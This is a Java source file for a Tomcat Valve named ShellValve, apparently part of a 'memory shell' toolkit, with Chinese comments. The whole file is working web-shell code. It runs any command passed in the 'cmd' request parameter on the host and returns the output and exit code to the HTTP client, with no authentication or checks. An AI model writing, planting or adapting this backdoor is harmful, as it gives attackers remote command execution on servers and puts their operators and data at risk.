package com.tomcatmemshell.valve;

import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.valves.ValveBase;

import javax.servlet.ServletException;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class ShellValve extends ValveBase {
    @Override
    public void invoke(Request request, Response response) throws IOException, ServletException {
        response.setContentType("text/plain");
        response.setCharacterEncoding("utf-8");
        String cmd = request.getParameter("cmd");
        try {
            // 执行系统命令
            Process process = Runtime.getRuntime().exec(cmd);
            // 读取命令输出
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }

            // 等待命令执行完成
            int exitCode = process.waitFor();
            output.append("\n命令执行完成，退出码为 " + exitCode);
            // 输出命令输出结果到客户端
            response.getWriter().print(output.toString());
        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        getNext().invoke(request, response);
    }
}
